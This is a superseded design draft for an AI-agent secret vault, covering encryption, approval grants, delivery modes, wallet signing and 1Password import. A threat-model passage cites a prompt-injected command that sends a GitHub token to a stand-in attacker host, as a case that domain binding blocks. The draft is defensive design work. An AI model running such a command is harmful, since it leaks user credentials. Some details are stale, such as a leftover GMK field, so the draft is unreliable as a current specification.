# Vaults — secret management for agents

> Superseded for current implementation: the group and scope-typed grant model
> in this older draft has been replaced by
> `vaults-grant-delivery-refactor.md`. New work should implement the final model
> there: no product `group`, tags plus `skill:<name>` tags, first-class
> `grant_id`, and unified avault delivery for mixed standard/protected runs.

Status: **v7 draft — architecture converged; P0 build plan drafted** (no code yet)
Owner: Alex + agent session `sestvmy6e5c8e`
Date: 2026-06-16 (v7, after review round 6 — scope-typed grants)

> **Build plan:** the P0 implementation checklist (final DDL, module layout, commit
> order, tests) lives in the companion **`vaults-p0-implementation.md`**.

v7 changes (round 6): **grants are now scope-typed** — a grant covers a set of
secrets defined by its scope: **`secret:NAME` (per-key) · `skill:S` · `group:G`**
(§9.5). This unifies two requests: a per-key "don't re-ask for N min" grant (the
smallest standing grant, the default on approve for normal secrets) **and** "unlock
a skill's secrets together" (a skill-scoped grant — the natural per-task unit).
Mechanism simplified from v6: drop the per-group `GMK` (it was group-specific and
couldn't span a skill's cross-group secrets); a grant instead caches the **set of
unwrapped DEKs** for the covered secrets in daemon memory for the TTL — uniform
across all three scopes, and tighter (daemon holds only the covered DEKs, never the
VMK). Note on Q "unify group & vault_link": the two data shapes stay distinct
(group = 1:1 partition; link = M:N dependency) — the unification is at the **grant**
layer, not the data model. `vault_grants` gains `scope_type`+`scope_ref` (§4.4).

v6 (round 5): group authorization first cut (per-group GMK) — **superseded by v7's
scope-typed DEK-set grants**; the bounds/lifecycle/keypair-exclusion/audit all carry
over.

v5 (round 4): layered auth (VMK + password-always + passkeys-on-top); data model
settled (flat `name` + `group` + `tags`; skills via `vault_links` relation, no
multi-container); signer order `local`→`external`(WalletConnect)→`mpc`, `aa`
dropped; `export`/`inject` de-emphasized (help-only); 1Password import (§13.5).

## 1. Background

Agents constantly need third-party credentials (API keys, tokens, signing keys).
Today every credential is plaintext: platform tokens and provider keys in
`~/.avibe/config/config.json` / `state/settings.json`; runtime secrets get pasted
into chat, hand-written into `.env`, or shell-exported. Whatever enters the
conversation enters the LLM context — transcripts, IM history, provider logs.

PR #555 added response-side masking + a `secretFields.ts` registry. The UI shell
already reserves `/vaults` + `VaultsPage.tsx`. Industry hit the same wall in
2025–26 (GitGuardian: 24k+ secrets in MCP configs; OWASP: prompt-context leakage
a top LLM risk; a wave of agent-vault products, §14). Core principle:

> **Secrets must never enter the model's context. The model handles secret
> *names*; the platform handles secret *values*.**

## 2. Goals and non-goals

Goals: **Store** (named secrets, env-var model, two protection tiers) · **Deliver**
(CLI, values never on stdout, indirect injection) · **Ask** (`$<NAME>` → user
fills via UI, agent woken with name only) · **Approve** (per-use, inline web card)
· **Link** (skills) · **Sign** (pluggable provider; `local` default).

Non-goals (now): team sharing; replacing provider OAuth; on-chain *broadcast*
(no secret needed); defending a malicious same-OS-user process (§3); **building
crypto** (we assemble audited libs); **account-abstraction / session-key signing**
(`aa` — dropped from current scope per round 4, revisit if agent-autonomous
on-chain spending becomes a real need); a 1Password-style **multi-container
keyspace** (single-user → no sharing boundary; §4).

## 3. Threat model

| # | Threat | Defense |
| --- | --- | --- |
| T1 | value → LLM context / transcripts / IM | values never on stdout; injection below the text channel; ask via UI |
| T2 | DB/file exfiltration | encrypted at rest (§7); vault tables denylisted in `data query` |
| T3 | prompt-injected agent uses a high-value secret silently | `protected`: per-use approval, enforced cryptographically (unlock factor not on the machine) |
| T4 | agent exfiltrates a delivered value | sign/proxy: value never in agent space; outbound redaction (§10) |

Honest limits: a malicious same-OS process can read M1/M2 material or the
standard-tier decrypt path (standard tier stops accidents + remote exfiltration,
not a determined local attacker; protected + sign/proxy are the answer). An
actively compromised daemon can serve malicious browser JS — we trust the daemon
(user's own machine); browser-side crypto minimizes *passive* exposure, not E2EE
vs a hostile server (Bitwarden-web boundary).

## 4. Data model (settled)

### 4.1 The shape: flat keyspace + light grouping, not multi-vault containers

You asked whether to add a layer above `key` like 1Password's "vaults." My
recommendation: **no multi-container keyspace** — and here's the reasoning. A
1Password "vault" exists primarily as a *sharing / access-control boundary*
(Personal vs Work vs team-shared). Avibe is **single-user, one instance per
person** — that rationale is absent. A container model would also fragment the
namespace: `$<NAME>` and `--env NAME` would need a qualifier (`$<vault:NAME>`),
complicating the agent's mental model, which is deliberately "secrets = env vars,
referenced by a single global name."

Instead, get 80% of the ergonomic benefit with metadata that does **not** fragment
the namespace:

- **`name`** stays **globally unique** — the one reference key (`$<NAME>`,
  `--env NAME`, `op://`-style). This is the core invariant.
- **`group`** (nullable, default `"default"`) — a lightweight, optional org axis +
  future unlock-scope hint ("grant this group for the session" — fights approval
  fatigue). This is the "vault-lite": a label, not a separate keyspace. A secret's
  name is unique regardless of group.
- **`tags`** (JSON array) — free-form filtering ("aws", "crypto", "prod").

The Vaults page renders **views** over the one flat keyspace: All / By group / By
skill. If a real multi-tenant or project-isolation need appears later, `group`
already exists as the seam to harden — but we don't pay for it now.

### 4.2 `vault_secrets`

| column | notes |
| --- | --- |
| `id`, `created_at`, `updated_at` | |
| `name` | **UNIQUE**, ENV-style `^[A-Z][A-Z0-9_]*$` — the reference key |
| `group` | nullable, default `"default"` — org + unlock-scope, **not** part of the name |
| `tags` | JSON array, optional |
| `kind` | `static` \| `keypair` |
| `protection` | `standard` \| `protected` |
| `signer_kind` | keypair only: `local` \| `external` \| `mpc:<provider>` |
| `source` | `manual` \| `imported:1password` \| `op-reference` (§13.5) |
| `ciphertext`, `nonce`, `wrap_meta` | envelope (§7); for protected, the DEK is wrapped by the VMK; null for `mpc`/`external`/`op-reference` (no local key/value) |
| `public_meta` | desc; keypair: algo, pubkey, address, path, provider handle; `op-reference`: the `op://…` URI |
| `policy` | allowed delivery modes, allowed hosts (proxy), `always_ask`, signer limits |
| `last_used_at`, `use_count` | |

### 4.3 `vault_links` — skills grouping is a relation, not a container

How skills group (your question): a skill **declares** the secrets it needs;
that's a **many-to-many relation**, not ownership. `vault_links`:
`(secret_name, skill_name, source ∈ {skill_meta, agent, user}, required, created_at)`,
unique on `(secret_name, skill_name)`.

- One secret used by three skills = **one** `vault_secrets` row + three link rows.
  No duplication, no copies, no per-skill keyspace.
- `skill_meta` links are synced from SKILL.md frontmatter (§13); `agent`/`user`
  links are explicit.
- The "By skill" view groups by joining `vault_links` → each skill shows its
  required keys with ✓ configured / ✗ missing + one-click fill. A key shared by
  skills simply appears under each.

### 4.4 `vault_groups`, `vault_requests`, `vault_grants`, `vault_audit`, config

**`vault_groups`** (groups become a managed entity once they carry authorization
policy — but still **not** a keyspace boundary; a secret's `group` is just a label
pointing here, names stay global): `name` (unique), `description`, `grantable`
(bool, default `true`; forced `false` if the group contains any `keypair`),
`max_grant_ttl_seconds` (default 900 = 15 min, cap 3600), `created_at`. Seed row:
`default`.

**`vault_requests`** (one queue): `request_type`
`provision`/`access`/`sign`/`proxy`/`keygen`, `secret_name`, `requester`,
`delivery`, `status`, `expires_at`, `message_id`.

**`vault_grants`** (metadata + audit of active scope-typed grants; the key material
— the cached DEK set — is **never** stored here, only held in daemon memory, §9.5):
`id`, `scope_type` (`secret`/`skill`/`group`), `scope_ref` (the name), `session_id`
(nullable = any-session), `created_at`, `expires_at`, `revoked_at`,
`created_by_request_id`, `status` (`active`/`expired`/`revoked`). The resolved
member set may be snapshotted for audit; it's frozen at grant time.

**`vault_audit`**: append-only, values never appear. Vault config (VMK wraps, KDF
params, machine-key mode, key-check) in `state_meta` under `vault:*`. `vibe data
query` denylists `vault_secrets`; the rest stay queryable.

Tiers: **`standard`** ("plain" UX) — encrypted at rest under the machine key
(§7.2), daemon-decryptable, headless. **`protected`** ("encrypted" UX) — under the
VMK (§7.1), needs approval + a user factor. `keypair` always `protected`.

## 5. Delivery modes — the security ladder

**Recommended & promoted: `run`, `proxy`, `sign`** — the value never enters
agent-readable space. **`export` and `inject` are de-emphasized** (round 4): they
exist for cases the others can't cover, but they are documented in `vibe vault
--help` **only** — never surfaced in the agent-facing system guidance / injected
prompt, never the top-level recommendation. The agent reaches for them
deliberately, not by default.

### M1 `run` — child-process env (default, strongest)

```
vibe vault run --env OPENAI_API_KEY --env DB_URL=PROD_DB_URL --env-skill deploy-aws -- python sync.py
```

Resolves values, spawns the child with them in **its** env, execs. Multi-var:
repeat `--env NAME`, alias `--env LOCAL=VAULT_NAME`, or `--env-skill` for a skill's
whole set. **Cannot export into the calling shell — OS guarantee, not a
limitation** (a child never writes its parent's env; and the agent's Bash tool
doesn't persist shell state across calls anyway). That's *why* it's strongest: the
value lives only in the child's memory, the agent sees only the child's output,
and it's gone on exit. **Only mode where the value provably never enters the
agent's text channel.**

### M4 `proxy` — brokered HTTP (value never in agent space)

```
vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/repos/x/y/issues -d @body.json
```

Daemon attaches the credential per the auth template, forwards; agent sees only the
response. **Domain binding** (allowed-hosts, deny by default) fails a prompt-
injected `fetch --auth GITHUB_PAT https://evil.com` closed.

### M3 `sign` — signing oracle / wallet (key never leaves the signer) — §8

### M1′ `export` / M2 `inject` — de-emphasized (help only)

`export` streams `export NAME='value'` for `eval "$(vibe vault export --env A)"`
(command-substitution keeps it off the visible TTY; only within one Bash call;
weaker than `run` — value transits the agent's own shell). `inject` renders a file
(`--format dotenv|json|yaml|toml` or `--template`, `0600`, **no default TTL** — opt
in `--ttl` for ephemeral files). Both *materialize* the value where the agent's
channel could reach it; kept for file-consuming tools / many-commands-in-one-shell,
not promoted.

## 6. Dynamic ask — `$<NAME>` and `vibe vault request`

`$<OPENAI_API_KEY>` in a reply → `core/reply_enhancer.py` extracts it (outside code
fences) → `provision` request. Web: inline **SecureInputCard** (out-of-band TLS
submit). IM: `🔐 Agent requests OPENAI_API_KEY → [Open Vaults](…?request=id)`.
`vibe vault request NAME --wait` long-polls; `--no-wait` → `hook_send` on
fulfillment. Creation hints use `--spec file|-` or `--spec-json` and may include
non-secret fields such as `protection`, `group`, `tags`, `policy`, and
`links.skills`; the request CLI intentionally has no `--skill` flag. **Wake-up
carries the name only, never the value.**

## 7. Crypto & auth (Q1: password + passkey, layered)

### 7.1 Envelope with a Vault Master Key

The answer to "password by default, passkey on top, password as fallback/reset":
**yes, fully — they are not mutually exclusive.** The mechanism is a two-level
envelope (the Bitwarden model):

```
VMK  = Vault Master Key (random 32B), the protected-tier root
  wrapped by KEK_password = Argon2id(vault password, salt)   ← always present (recovery root)
  wrapped by KEK_passkey_i = HKDF(WebAuthn PRF_i)            ← 0..N, added on top
protected secret:  value --AES-256-GCM(DEK)--> ciphertext;  DEK --wrapped by--> VMK
standard secret:   value --AES-256-GCM(DEK)--> ciphertext;  DEK --wrapped by--> KEK_machine (§7.2, daemon-side)
```

Each protected DEK is wrapped directly by the VMK. (v6 introduced a per-group
`GMK = HKDF(VMK, group)` layer; v7 drops it — see §9.5: grants now cache the
covered **DEK set**, which works for any scope and never exposes the VMK, so the
extra key layer earns nothing.)

Because the **VMK is wrapped independently by each factor**, any one factor
unwraps it. So:

- **Default = password.** Set a vault password → `KEK_password` wraps the VMK.
  Everything works with just the password.
- **Enable passkey on top.** Unlock the VMK once (password), then wrap a copy with
  the passkey's PRF-derived KEK. Now there are two independent wraps of the same
  VMK. Add several passkeys the same way (laptop + phone).
- **Default to passkey login, password as fallback.** The unlock UI tries the
  passkey first (Face/Touch ID); if the passkey is unavailable/fails, it falls
  back to the password prompt — both paths unwrap the same VMK, so they're
  interchangeable.
- **Lost passkey / reset.** Password still unwraps the VMK (it's an independent
  wrap), so no data is lost. "Reset passkey" = unlock VMK via password → drop the
  old passkey wrap → add a new one. The password is the structural recovery root;
  the passkey is a convenience layer, never the sole gate.

This also fixes the data-loss caveat from §7.3 in v4 (Tim Cappalli's warning:
delete-passkey = lose-data) — here a deleted passkey only removes one wrap of the
VMK; the password wrap remains.

Adding/rotating a passkey or changing the password re-wraps **one** thing (the
VMK), not every secret — cheap.

### 7.2 Machine key (standard tier)

32 random bytes on first write. **Default — key file**
`~/.avibe/state/vault/machine.key` (`0600`): lives inside `~/.avibe`, travels with
backups → no new loss mode; "copy `~/.avibe`" keeps working. **Opt-in — OS
keychain** (`keyring`): key/data physically separated; needs `vibe vault
key export/import` to migrate; headless boxes auto-fall back to file. Failure UX:
key missing/mismatch → list affected secrets, offer import-key or re-enter;
AES-GCM auth prevents silent wrong-key garbage.

### 7.3 The factors

- **Vault password**: Argon2id (interactive params), browser-side via `hash-wasm`.
- **Passkey PRF** (the encryption mechanism, mature — Bitwarden/Dashlane/1Password/
  WhatsApp use it): app passes a fixed salt → browser hashes it with a
  `"WebAuthn PRF"` context → authenticator computes
  `HMAC-SHA256(chip-held credential secret, hashed salt)` → deterministic 32B (the
  chip secret never leaves the secure element) → HKDF → `KEK_passkey`. Domain-bound
  (phishing-resistant). 2026 support: iCloud Keychain (Safari 18+), Google Password
  Manager, Windows Hello, 1Password (✓ + open-sourced an E2EE lib), Bitwarden/
  Dashlane; gap = roaming security keys on iOS (Apple won't pass PRF). Because
  support isn't universal and a passkey can be lost, it's layered over the password
  per §7.1, never the only factor.
- Libraries: `pyca/cryptography` (in-tree) AES-GCM/HKDF/ed25519; `hash-wasm`
  browser-side argon2 + `argon2-cffi` for daemon `key export`; `keyring` optional.

### 7.4 Decryption locus (recap, settled)

Standard → daemon-side permanently (headless). Protected → browser-side from commit
1 (browser derives the factor KEK, unwraps VMK, unwraps the DEK, decrypts; POSTs
only the one value back; for `local` keypairs signs in-iframe and returns only the
signature). Vault password never reaches the daemon. `wrap_meta` client-unwrappable
from the first migration — no rewrite.

## 8. Wallet & signer architecture

A keypair carries `signer_kind`; one **request → approval → signature** flow
regardless of backend (`SignerProvider` with `address()` + `sign(payload, type)`).
**Implementation order (round 4): `local` → `external` → `mpc`. `aa` dropped for
now.**

| `signer_kind` | key location | account/cloud | order |
| --- | --- | --- | --- |
| **`local`** (default) | on your machine, encrypted in the vault, decrypted only in an isolated browser iframe | none | **1st** |
| **`external`** (WalletConnect) | the user's own wallet (MetaMask/Rabby); vault custodies nothing — sign requests route to the real wallet | none (their wallet) | **2nd** |
| **`mpc:<provider>`** | sharded across provider cloud + device, never whole (Privy/Web3Auth/Turnkey/Lit) | provider account + cloud | **3rd** |

**`local` (your Q's a/b/c, confirmed):** (a) mnemonic + private key are
envelope-encrypted under the protected tier (always); `mpc`/`external` store no key.
(b) decrypt + sign **in the browser iframe** — same browser-side decryption as any
protected secret; only the signature leaves. (c) mature pattern = **cross-origin
iframe isolation** (Privy/Magic/Dynamic): key only in iframe memory, host↔iframe via
origin-validated `postMessage`, `viem toAccount` proxy, ECDSA via `@noble/curves`
(audited; viem/ethers use it) + `@scure/bip39`, served `COOP:same-origin` +
`COEP:credentialless`, tx-decode + approve UI **inside** the trusted iframe
(anti-clickjack). Build = assemble audited libs (incl. ethers.js keystore as the
proven encrypt+decrypt+sign reference) + a small iframe harness; **not** a
cryptosystem, **not** a drop-in product (§8.6 below).

**`external` (WalletConnect, 2nd):** the agent's `sign` request surfaces an
approval card; on approve, the daemon opens a WalletConnect session to the user's
real wallet (QR / deep link), the user signs **in their own wallet**, the signature
returns. Zero custody in the vault — the strongest "we never hold the key" story,
and a natural fit for users who already have a wallet. No custody account.

**`mpc` (3rd, opt-in):** Privy/Web3Auth/Turnkey/Lit — threshold/TEE custody, key
never whole, supports unattended policy signing. All require a provider account and
put the key in their cloud/network — that's why they're last and opt-in, not the
local-first default. (Detail matrix retained in §8.5.)

### 8.5 Provider facts (retained from v4)

Turnkey = AWS Nitro TEE, key ciphertext in their cloud DB decrypted only in the
enclave, needs org + API key (sub-org creation server-side; sign client-side via
passkey + `@turnkey/viem`). Privy = SSS shares (device-local + auth-cloud) or TEE
2-of-2, app ID. Web3Auth = MPC-TSS across device + Torus nodes, dashboard clientId,
frontend-only OK. Lit = PKP via DKG across a decentralized node net (>2/3), mint PKP
on-chain. **All need an account; none keeps the key on your machine.**

### 8.6 Build vs reuse (settled)

No drop-in local agent-signing vault exists. We assemble audited libs (~90%): key
storage/decrypt via our AES-GCM envelope (or ethers.js
[keystore](https://docs.ethers.org/v3/api-wallet.html), Web3 Secret Storage) +
signing via `@noble/curves`/`viem` + `@scure/bip39`. We build (~10%): the iframe
harness, approval wiring, the `SignerProvider` interface. No hand-rolled crypto.

## 9. Approval flow — inline interactive card

Web-only. Pushed into the current session as a structured message, inline card.
Codebase note: `system` message type exists but `core/message_mirror.py`
deliberately doesn't persist it → reuse the **quick-reply rails** instead (persisted
message, `author='system'`, `content.card_type='approval'`, set-once choice like
`quick_reply_chosen`); add a `message.updated` SSE (only IM has it) so the card
flips in place. `ApprovalCard` branch in `ChatPage.tsx`. Web session → inline; IM →
notify + deep link; headless → persists, Vaults inbox fallback. Same
`vault_requests` row.

### 9.5 Scope-typed authorization — per-key / skill / group grants (anti-fatigue)

Problem: every use of a `protected` secret triggers approval + unlock. An agent
that uses `STRIPE_KEY` five times in a task, or a skill that needs several secrets,
prompts every time. The fix is a **grant**: approve once, stay unlocked for a
bounded window. Two requests shaped this (round 6): a **per-key** "don't re-ask for
N min" grant, and **"unlock a skill's secrets together."**

**One mechanism, three scopes.** A grant covers a *set* of secrets defined by its
`scope`:

- **`secret:NAME`** — just that one key (the smallest standing grant; the default on
  approve for normal secrets, so rapid re-use of the same key doesn't re-prompt).
- **`skill:S`** — every secret linked to skill S (resolved via `vault_links` at grant
  time). This is the natural per-task unit: an agent about to run a skill gets *one*
  approval for the whole bundle, then all its `vault run` calls are silent.
- **`group:G`** — every secret in a manual org group G.

(On "should `group` and `vault_link` be unified?" — the two data shapes stay
distinct, because they *are* distinct: `group` is a 1:1 partition for organization,
`vault_links` is an M:N dependency relation. The unification belongs at the **grant**
layer — a grant can target a key, a skill, or a group — not by collapsing two
different relations into one.)

**How a grant decrypts (uniform, tighter than v6's GMK).** On approval the browser
(holding the unlocked VMK) unwraps the DEK of each covered secret and POSTs that
**set of DEKs** to the daemon over TLS. The daemon caches `{secret_id → DEK}` for
the grant's window and, while live, decrypts those secrets on headless `vault run`
with no browser and no prompt. **It caches keys, not plaintext** — each value is
decrypted only at the instant of a `vault run` (from the cached DEK + the DB
ciphertext) and dropped after injection, so plaintext never sits idle in memory;
only the 32-byte DEKs do. **Blast radius = exactly the covered set** — the
daemon holds only those DEKs, never the VMK, so nothing outside the set is
reachable. The covered set is **frozen at grant time** (a secret added to the
group/skill afterward isn't auto-covered — you'd re-approve), which is the
conservative, predictable behavior.

**Bounds (all shown on the card, all enforced):**

- **TTL**: per-key default short (proposed **5 min**); skill/group default **15 min**;
  options 1 h and until-revoked (cleared on daemon restart); capped by the group's
  `max_grant_ttl_seconds`.
- **Session binding**: this-session-only (default) · any-session (explicit opt-in).
- **Hard exclusion: `keypair`/signing is never grantable.** A standing grant that
  lets an agent sign ETH unattended is the catastrophic case — every signature stays
  per-use approval with the decoded preview. A skill/group grant covers only the
  **grantable (static) subset**; any keypair in the set is excluded and still
  per-signature (the card says e.g. "covers 3 of 4 — ETH_KEY still asks each time").
  A sensitive static secret opts out via per-secret `always_ask`.

**Lifecycle & honesty:**

- The cached **DEK set lives in daemon memory only, never persisted.** `vault_grants`
  records the grant + its bounds for UI/audit, not key material. Restart → all grants
  gone (re-approve). Safe default, not a bug.
- A **conscious, scoped relaxation of §8.4.** Default (no grant): the daemon never
  holds key material; every protected use is browser-decrypted. With a grant: the
  user *explicitly* trades safety for convenience — bounded by time + an explicit
  secret set + (default) one session, in-memory, revocable, audited. Same tradeoff a
  password manager makes on "unlock", made opt-in and visible. (Python can't truly
  zeroize; cached DEKs are the same exposure class as any in-memory secret,
  time-bounded — noted, accepted.)
- **The approval card offers the ladder.** "Approve once" (strict; the only option
  for `always_ask` secrets) · "…and don't re-ask this key for 5 min" (per-key,
  default) · "Unlock **skill deploy-aws** · 15 min (covers 3 of 4)" · "Unlock
  **group crypto** · 15 min." Each shows the covered count, TTL control, and session
  toggle, so the blast radius is explicit (rubber-stamping stays visibly risky).
- **Revocation & visibility.** The Vaults page lists active grants (scope, covered
  secrets, expires-in, bound session) with one-click **Revoke** (drops the cached
  DEKs at once). Auto-revoke on TTL expiry, restart, explicit revoke, and (if
  session-bound) session archive. Grants + each use are audited (`granted` /
  `delivered-under-grant` / `grant-expired` / `grant-revoked`).
- **Resolve path:** `/internal/vault/resolve` checks for an active, in-scope grant
  covering the secret → if present, decrypt headlessly from the cached DEK; else fall
  back to the `access` request + inline approval card (which offers the ladder).

## 10. Outbound redaction (tripwire)

Dispatcher is the single outbound chokepoint: scan for known plaintext values
(standard; protected during an active grant), replace with `[REDACTED:NAME]` +
audit + warning. Exact + base64/url variants. Turns an echoed secret into a logged
near-miss.

## 11. API & CLI surface

REST `/api/vault/*`: `GET/POST/PATCH/DELETE /secrets`, `GET /requests`,
`/requests/{id}/{fulfill|approve|deny}`, `GET/POST/DELETE /links`, `GET /audit`,
`/keys/generate`→`/confirm` (web-only ceremony), `GET/POST /config`, `GET /signers`,
`POST /import/1password` (§13.5), `GET/POST/DELETE /grants` (list / create-from-
approval with `{group, gmk, ttl, session_binding}` / revoke; §9.5),
`GET/POST/PATCH /groups`. SSE: `vault.request.new`, `vault.request.decided`,
`vault.secrets.changed`, `vault.grant.changed`, `message.updated`.

Internal UDS `/internal/vault/*`: `resolve`, `provision`, `sign`, `fetch`,
`requests/{id}/wait`.

CLI `vibe vault …`: create/set is intentionally not exposed to agents; values
enter through browser-side sealed/blind-box payloads. `list [--skill S] [--group G] [--tag t] [--json]` · `rm` · `run` (promoted) ·
`fetch` (promoted) · `sign` (promoted) · `request [--spec file|- | --spec-json json]` · `link/unlink --skill S NAME` ·
`audit` · `key export/import` · `import 1password [--vault V]` (§13.5) · `export` /
`inject` (help-only, not promoted). No `vibe vault get`; no command prints a value.

## 12. End-to-end flows

Standard/M1 (silent): `vault run` → UDS `resolve` → machine-KEK unwrap → child env.
Protected/M1: until `protected` → `access` request → inline card → browser unlock
(passkey or password → VMK → DEK, §7.1/§8.4) → complete blocked `resolve`. Dynamic
ask: `$<NEW_KEY>` → SecureInputCard → save → name-only wake-up. ETH sign (local):
web key ceremony (mnemonic once) → agent builds `tx.json` via its RPC → `vault sign`
→ card decodes `to/value/gas/chainId/selector` → approve → iframe decrypts+signs →
signature → agent broadcasts. Sign (external): card → WalletConnect → user signs in
their wallet → signature.

## 13. Skills integration

SKILL.md frontmatter gains `secrets:` (name/required/description); read via
`askill --json` (askill passes it through). Synced to `vault_links` with
`source=skill_meta`. Per-skill view (✓/✗ + one-click fill). Many-to-many; no
duplication (§4.3).

### 13.5 1Password import (bonus research — feasible)

Yes — a user can pull secrets from 1Password into the vault. 1Password exposes two
programmatic surfaces; both fit, with different reach:

- **`op` CLI (interactive, recommended first cut).** `op vault list` +
  `op item list --vault X --format json` to enumerate, `op item get … --format json`
  / `op read "op://Vault/Item/field"` to fetch. Auth = the user's **1Password
  desktop app + CLI integration (biometric unlock)**. Because Avibe runs on the
  user's own machine (local-first), `op` is right there, and crucially it **can read
  the built-in Personal/Private vault**. UI flow: "Import from 1Password" →
  `op vault list` → pick a vault → list items → user selects → fetch values →
  encrypt under **our** envelope → store with `source=imported:1password`. One-time
  copy (now two copies exist — 1P + ours).
- **Service-account token + Python SDK (`onepassword-sdk`, headless option).**
  `Client.authenticate(token)` → `client.secrets.resolve("op://…")` / list vaults &
  items. Works on headless boxes (Incus tenants). Limitation: **service accounts
  cannot read the built-in Personal/Private vault** — only explicitly-shared vaults.
  Good for "import from a dedicated shared vault."
- **Live `op://` reference (future passthrough, `source=op-reference`).** Instead of
  copying, store the `op://Vault/Item/field` URI and resolve at delivery time via
  `op read`. Keeps 1Password as the single source of truth (no duplication), but
  adds a runtime dependency on `op` being authed and the value transits at resolve.

Recommendation: ship **`op` CLI one-time import** first (simplest, covers Personal
vault, uses the user's existing biometric unlock); offer **service-account** for
headless; consider **live `op://` reference** later. 1Password explicitly markets
service accounts + SDKs for [agentic AI access](https://1password.com/blog/service-accounts-sdks-agentic-ai),
so this is a supported path. Honest note: import *copies* the secret into our vault
(two copies, two blast radii); the live-reference mode is the only one that avoids
duplication, at the cost of a hard `op` dependency.

## 14. Prior art & libraries

Injection: 1Password [`op run/inject`](https://developer.1password.com/docs/cli/secret-references/),
Infisical `infisical run`. Brokered creds: [Arcade](https://docs.arcade.dev/en/get-started/about-arcade),
Composio. Agent-vault OSS: [Infisical agent-vault](https://github.com/Infisical/agent-vault)
(P3 proxy candidate). In-browser sign + keystore: [`@noble/curves`](https://paulmillr.com/noble/),
[`viem toAccount`](https://viem.sh/docs/accounts/local/toAccount),
[ethers keystore](https://docs.ethers.org/v3/api-wallet.html), cross-origin iframe +
[COOP/COEP](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless).
Embedded-wallet self-custody: [Privy](https://privy.io/blog/how-privy-embedded-wallets-work),
Magic, Dynamic. WalletConnect (the `external` path). MPC: [Web3Auth](https://web3auth.io/docs/sdk/mpc-core-kit/mpc-core-kit-js),
[Lit](https://developer.litprotocol.com/user-wallets/pkps/overview),
[Turnkey](https://docs.turnkey.com/embedded-wallets/sub-organizations-as-wallets).
Passkey encryption: [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/Developers_Guide_to_PRF.html),
[1Password PRF lib](https://1password.com/blog/encrypt-data-saved-passkeys),
[Bitwarden](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/),
[data-loss caveat](https://lilting.ch/en/articles/passkeys-prf-extension-encryption-risk).
1Password import: [`op item`](https://developer.1password.com/docs/cli/reference/management-commands/item/),
[Python SDK](https://github.com/1Password/onepassword-sdk-python).

## 15. Architecture frozen up front, delivery incremental

Lock the architecture now (data model incl. `group`/`tags`/`vault_links`,
`wrap_meta` + VMK envelope, decryption split, `SignerProvider` interface, inline-
card shape — final from commit 1); deliver as focused commits, no rip-and-replace.
Capability order: (1) store + envelope (VMK + machine key) + CRUD (groups/tags) +
`data query` denylist; (2) M1/M4 + dynamic ask; (3) protected tier + browser
decryption + password→passkey layering + inline ApprovalCard + `message.updated` +
redaction; (4) skills `secrets:` linkage + per-skill view + keychain mode + key
export/import + **1Password import**; (5) `local` signer (iframe, BIP-39 ceremony,
EIP-155/191/712 decoded approvals); (6) `external` WalletConnect signer; (7) `mpc`
provider plug-ins; (8) transparent proxy + config-secret migration (closes #555) +
session-scoped group grants. (`aa` deferred out of scope.)

## 16. Decision log

R1 (06-12): approval web-only; signer → secp256k1/ETH; phasing OK.
R2 (06-13): protected decryption browser-side from commit 1; architecture frozen;
pluggable `SignerProvider`; local sign in iframe; inline ApprovalCard.
R3 (06-14): passkey = WebAuthn PRF + HKDF; assemble audited libs not build crypto;
3rd-party signers all need account + cloud → opt-in; `run` multi-var, can't export
to parent; `inject` formats + TTL-off.
R4 (06-14):
1. Auth is **layered** — VMK wrapped by password (always, recovery root) + passkeys
   (on top); default-to-passkey-login with password fallback; reset passkey via
   password. Not either/or (§7.1).
2. `export`/`inject` **de-emphasized** — `--help` only, never in agent-facing
   guidance; `run`/`proxy`/`sign` are promoted (§5).
3. Signer order **`local` → `external`(WalletConnect) → `mpc`**; **`aa` dropped**
   from scope (§8, §15).
4. Data model: **flat global `name`** + optional `group` (vault-lite, not a 1Password
   multi-container) + `tags`; **skills group via `vault_links` relation**, not a
   container (§4). No multi-vault keyspace for a single-user product.
5. **1Password import** is feasible — `op` CLI one-time import first (covers Personal
   vault), service-account for headless, live `op://` reference later (§13.5).

R5 (06-16): group authorization first cut (per-group `GMK = HKDF(VMK, group)`) —
**superseded by R6**.
R6 (06-16): **grants are scope-typed** — `secret:NAME` (per-key, default-on-approve,
proposed 5 min) / `skill:S` (unlock a skill's secrets together, the per-task unit,
15 min) / `group:G` (manual bundle). One mechanism: a grant caches the covered
**DEK set** in daemon memory (drop v6's per-group GMK — too group-specific, can't
span a skill's cross-group secrets; DEK-set is uniform + tighter, never exposes the
VMK). Set frozen at grant time. `group` and `vault_link` stay distinct data shapes;
the unification is at the grant layer. `keypair` never grantable (skill/group grants
cover only the grantable static subset). `vault_grants` gains
`scope_type`+`scope_ref`. Bounds/lifecycle/audit from R5 carry over.

## 17. Open questions

1. Reveal-on-click for standard-tier values in the UI: allow or never?
2. `request --wait` / approval timeout default (proposal: 10 min); how a
   denied/expired wait reads to the agent.
3. Launch with passkey support on, or password-only first + passkey fast-follow
   (given the iOS-roaming-key gap)? (Layering from §7.1 makes either safe.)
4. askill `secrets:` frontmatter — confirm we own it + file the issue.
5. ETH preview depth: selector + raw calldata to start, or ABI-decode +
   dangerous-selector warnings day one?
6. ~~unlock-scoping — design now or defer?~~ **Designed as scope-typed grants
   (§9.5, R6).** Remaining sub-decisions: per-key default TTL (proposed 5 min) +
   skill/group default TTL (proposed 15 min); default binding (proposed
   this-session-only); whether "until-revoked" TTL ships at launch or is held back
   as too broad; and whether "Approve once" auto-applies a per-key window by default
   (proposed yes, except `always_ask` secrets).
7. 1Password: one-time import only, or also build the live `op://` reference mode
   (single-source-of-truth, but a hard `op` runtime dependency)?
